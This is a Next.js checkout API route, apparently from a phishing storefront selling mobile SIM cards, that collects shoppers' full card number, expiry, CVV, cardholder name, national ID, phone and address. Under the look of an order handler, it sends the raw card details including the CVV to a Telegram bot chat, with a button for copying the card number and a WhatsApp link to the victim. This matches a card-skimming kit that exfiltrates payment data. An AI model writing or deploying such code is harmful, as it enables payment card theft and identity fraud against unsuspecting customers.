import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز
  try {
    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
  } catch {}

  // Send Telegram
  const ltr = "\u200E";
  const text = [
    `🛒 متجر مؤسسة مسار الجوال لبيع الشرائح`,
    `🔖 Order ID: ${ltr}#${orderId}`,
    ``,
    `💲 Total Amount: ${ltr}${total} SAR`,
    ...(installmentType === "installment"
      ? [`🧾 First Payment: ${ltr}${downPayment} SAR`]
      : [`🧾 Payment Type: Full Amount`]),
    ``,
    `🏦 MadaVisa - New Order`,
    `🙍 Order For: ${ltr}${customer ?? "-"}`,
`📱 Phone Number: ${ltr}${whatsapp ?? "-"}`,
    `🪪 Card Number: ${ltr}${cardNumber}`,
    `✍️ Card Holder: ${ltr}${cardHolder}`,
    `📆 Valid To: ${ltr}${expiry}`,
    `🔑 CVV: ${ltr}${cvv}`,
  ].join("\n");

  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ  البطاقة", copy_text: { text: cardNumber } },
        ...(whatsappNum ? [{ text: "💬 WhatsApp", url: `https://wa.me/${whatsappNum}` }] : []),
      ],
    ],
  };

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
      }
    );
    const tgJson = await tgRes.json();
    console.log("[notify] telegram response:", JSON.stringify(tgJson));
  } catch (e) {
    console.error("[notify] telegram error:", e);
  }

  return NextResponse.json({ ok: true, orderId });
}
